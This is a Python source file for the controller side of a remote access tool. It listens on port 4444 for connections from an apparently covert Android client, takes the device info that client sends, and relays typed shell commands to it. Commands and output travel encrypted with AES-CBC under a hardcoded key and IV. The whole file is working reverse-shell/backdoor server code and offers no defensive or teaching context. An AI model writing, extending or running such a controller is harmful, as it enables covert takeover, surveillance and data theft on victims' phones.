import socket
import threading
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# MUST MATCH THE ANDROID CLIENT'S VALUES EXACTLY
AES_KEY = "A1B2C3D4E5F6G7H8".encode('utf-8')  # 16 bytes key
AES_IV = "H8G7F6E5D4C3B2A1".encode('utf-8')   # 16 bytes IV

HOST = '0.0.0.0'
PORT = 4444

def encrypt(msg):
    """Encrypt using AES-CBC to match Android client"""
    cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
    padded = pad(msg.encode('utf-8'), 16)
    enc = cipher.encrypt(padded)
    return base64.b64encode(enc).decode('utf-8')

def decrypt(enc):
    """Decrypt using AES-CBC to match Android client"""
    try:
        cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
        decoded = base64.b64decode(enc)
        decrypted = cipher.decrypt(decoded)
        return unpad(decrypted, 16).decode('utf-8')
    except Exception as e:
        return f"[DECRYPTION ERROR: {e}] Raw: {enc}"

def read_line(sock):
    """Read until newline character"""
    buffer = b""
    while True:
        chunk = sock.recv(1)
        if not chunk or chunk == b'\n':
            return buffer.decode('utf-8')
        buffer += chunk

def handle_client(conn, addr):
    print(f"[+] Connection from {addr[0]}")
    
    try:
        # Read the first line (should be encrypted device info)
        first_line = read_line(conn)
        if first_line:
            decrypted = decrypt(first_line)
            print(f"[Client] {decrypted}")
        else:
            print("[Client] No initial data received")

        while True:
            try:
                cmd = input("Shell> ").strip()
                if not cmd:
                    continue
                
                if cmd.lower() == "exit":
                    break
                
                # Encrypt and send command
                enc_cmd = encrypt(cmd)
                conn.sendall((enc_cmd + "\n").encode('utf-8'))
                print(f"[Sent] {cmd}")

                # Read response line by line
                response = read_line(conn)
                if not response:
                    print("[-] Connection closed by client")
                    break
                
                # Decrypt and display response
                decrypted_response = decrypt(response)
                print(f"[Response]\n{decrypted_response}")

            except KeyboardInterrupt:
                print("\n[!] Keyboard interrupt")
                break
            except Exception as e:
                print(f"[!] Error in command loop: {e}")
                break

    except Exception as e:
        print(f"[!] Connection error: {e}")
    finally:
        conn.close()
        print(f"[-] Connection closed with {addr[0]}")

def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((HOST, PORT))
        s.listen(5)
        print(f"[*] Listening on {HOST}:{PORT}...")
        print(f"[*] Using AES-CBC with key: {AES_KEY.decode()}, IV: {AES_IV.decode()}")
        
        while True:
            conn, addr = s.accept()
            print(f"[+] New connection from {addr[0]}")
            thread = threading.Thread(target=handle_client, args=(conn, addr))
            thread.daemon = True
            thread.start()

if __name__ == "__main__":
    main()
